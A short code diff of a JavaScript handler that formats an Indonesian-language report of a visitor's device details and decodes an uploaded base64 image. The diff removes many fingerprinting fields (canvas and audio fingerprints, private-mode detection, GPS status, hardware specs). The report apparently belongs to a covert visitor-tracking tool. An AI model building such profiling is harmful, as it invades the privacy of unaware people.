@@ -92,32 +92,6 @@ export default async function handler(req, res) {
 -Timezone: ${timezone} (GMT${timezoneOffset >= 0 ? "+" : ""}${timezoneOffset})
 -Cuaca Lokal: ${deviceInfo.weather || "Tidak diketahui"}
 -Jarak dari Kota Terdekat: ${deviceInfo.cityDistance || "Tidak diketahui"}
-
-🧪 Browser & Tampilan
--Browser: ${browser.name} ${browser.version}
--User-Agent: ${userAgent}
--Mode Private: ${privateModeStatus}
--Resolusi Layar: ${screenInfo}
--Orientasi: ${deviceInfo.screenOrientation || "Tidak diketahui"}
--Canvas Fingerprint: ${canvasFingerprint}
--Audio Fingerprint: ${audioFingerprint}
-
-🔋 Performa Sistem
--Baterai: ${deviceInfo.batteryLevel}% (${deviceInfo.isCharging})
--RAM: ${deviceInfo.ram} GB
--Penyimpanan: ${deviceInfo.usedStorage} / ${deviceInfo.totalStorage}
--Tab Aktif: ${tabCount}
-
-🔒 Keamanan & Aktivitas
--Status GPS: ${gpsStatus}
--Login Terakhir: ${waktuLogin}
--Fingerprint Browser: ${browserExtensions}
-
-⚙️ Aplikasi / Client
--Versi Aplikasi: ${appVersion}
--Versi API: ${apiVersion}
-
-Mood Perangkat: ${deviceMood}
 `;
 
     const imageBuffer = Buffer.from(image.split(",")[1], "base64");
